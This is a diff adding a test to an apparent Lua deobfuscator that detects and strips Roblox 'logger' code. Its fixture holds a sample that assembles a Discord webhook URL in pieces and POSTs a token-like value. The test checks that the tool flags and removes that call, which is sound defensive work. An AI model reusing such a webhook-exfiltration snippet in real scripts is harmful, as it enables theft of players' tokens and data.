@@ -159,3 +159,18 @@ def test_binary_chunks_rejected():
 def test_string_format_accepts_proxies():
     r = sandbox.run('print(string.format("%d %s", game.Players, game))')
     assert r.prints == ["0 game"]
+
+
+def test_logger_found_inside_vm_output_and_removed_from_trace():
+    from deobf import logger
+
+    src = (
+        "-- This file was protected using Luraph Obfuscator v14.4.1 [https://lura.ph/]\n"
+        'local u=table.concat({"https://discord.com/api/","webhooks/1/abcDEF"})\n'
+        'request({Url=u,Method="POST",Body="tok"})\n'
+        'game:GetService("StarterGui"):SetCore("SendNotification",{Title="hi"})'
+    )
+    r = deobfuscate(src)
+    assert r.is_logger and any(f.id == "webhook" for f in r.findings)
+    clean, notes = logger.remove_from_trace(r.body)
+    assert "discord.com" not in clean and "SetCore" in clean and notes
